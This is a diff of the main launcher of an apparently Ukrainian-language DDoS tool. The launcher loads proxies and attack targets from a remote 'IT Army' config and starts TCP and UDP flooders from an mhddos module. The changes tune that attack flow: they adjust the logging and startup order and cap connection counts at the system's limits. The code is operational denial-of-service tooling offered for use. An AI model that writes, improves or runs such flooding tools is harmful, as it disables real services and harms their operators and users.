@@ -1,23 +1,23 @@
 # @formatter:off
-import colorama; colorama.init()
+try: import colorama; colorama.init()
+except:raise
 # @formatter:on
 import asyncio
-from functools import partial
 import sys
 import time
+from functools import partial
 from threading import Event, Thread
 from typing import List, Set, Union
 
 from src.cli import init_argparse
 from src.core import (
-    logger, cl,
-    IT_ARMY_CONFIG_URL, REFRESH_OVERTIME, REFRESH_RATE, ONLY_MY_IP,
-    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS, SCHEDULER_MIN_INIT_FRACTION
+    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS, IT_ARMY_CONFIG_URL, ONLY_MY_IP, REFRESH_OVERTIME,
+    REFRESH_RATE, SCHEDULER_MIN_INIT_FRACTION, cl, logger
 )
-from src.mhddos import main as mhddos_main, AsyncTcpFlood, AsyncUdpFlood, AttackSettings
-from src.output import print_progress, show_statistic, print_banner
+from src.mhddos import AsyncTcpFlood, AsyncUdpFlood, AttackSettings, main as mhddos_main
+from src.output import print_banner, print_progress, show_statistic
 from src.proxies import ProxySet
-from src.system import fix_ulimits, is_latest_version, setup_event_loop, WINDOWS_WAKEUP_SECONDS
+from src.system import WINDOWS_WAKEUP_SECONDS, fix_ulimits, is_latest_version, setup_event_loop
 from src.targets import Target, TargetsLoader
 
 
@@ -131,10 +131,11 @@ async def run_ddos(
 
     # initial set of proxies
     if proxies.has_proxies:
+        logger.info(f'{cl.YELLOW}Завантажуємо проксі...{cl.RESET}')
         num_proxies = await proxies.reload()
         if num_proxies == 0:
             logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
-            exit()
+            return
 
     def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
         target_stats = target.create_stats(method)
@@ -164,11 +165,6 @@ async def run_ddos(
                 % (target.url.host, target.url.port, method)
             )
         return mhddos_main(**kwargs)
-
-    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
-    if not print_stats:
-        # Keep the docs/info on-screen for some time before outputting the logger.info above
-        await asyncio.sleep(5)
 
     active_flooder_tasks = []
     tcp_task_group = None
@@ -238,6 +234,7 @@ async def run_ddos(
             active_flooder_tasks.append(task)
 
     try:
+        logger.info(f'{cl.YELLOW}Завантажуємо цілі...{cl.RESET}')
         initial_targets, _ = await targets_loader.load(resolve=True)
     except Exception as exc:
         logger.error(f"{cl.RED}Завантаження цілей завершилося помилкою: {exc}{cl.RESET}")
@@ -245,7 +242,13 @@ async def run_ddos(
 
     if not initial_targets:
         logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
-        exit()
+        return
+
+    logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
+    if not print_stats:
+        # Keep the docs/info on-screen for some time before outputting the logger.info above
+        await asyncio.sleep(5)
+
     await install_targets(initial_targets)
 
     tasks = []
@@ -318,7 +321,7 @@ async def run_ddos(
 async def start(args, shutdown_event: Event):
     use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
     print_banner(use_my_ip)
-    fix_ulimits()
+    max_conns = fix_ulimits()
 
     if args.table:
         args.debug = False
@@ -352,6 +355,15 @@ async def start(args, shutdown_event: Event):
     # XXX: with the current implementation there's no need to
     # have 2 separate functions to setups params for launching flooders
     reload_after = 300
+    connections = args.threads
+    if max_conns is not None:
+        max_conns -= 50  # keep some for other needs
+        if max_conns < connections:
+            logger.warning(
+                f"{cl.MAGENTA}Кількість потоків зменшено до {max_conns} через обмеження вашої системи{cl.RESET}"
+            )
+            connections = max_conns
+
     await run_ddos(
         proxies,
         targets_loader,
@@ -360,7 +372,7 @@ async def start(args, shutdown_event: Event):
         args.http_methods,
         args.debug,
         args.table,
-        args.threads,
+        connections,
         use_my_ip,
         args.scheduler_initial_capacity,
         args.scheduler_fork_scale,
@@ -391,12 +403,12 @@ def main():
     shutdown_event = Event()
     try:
         # run event loop in a separate thread to ensure the application
-        # exists immediately after Ctrl+C
+        # exits immediately after Ctrl+C
         Thread(target=_main, args=[args, shutdown_event, uvloop], daemon=True).start()
         # we can do something smarter rather than waiting forever,
         # but as of now it's gonna be consistent with previous version
-        while True:
-            shutdown_event.wait(WINDOWS_WAKEUP_SECONDS)
+        while not shutdown_event.wait(WINDOWS_WAKEUP_SECONDS):
+            continue
     except KeyboardInterrupt:
         logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
         sys.exit()
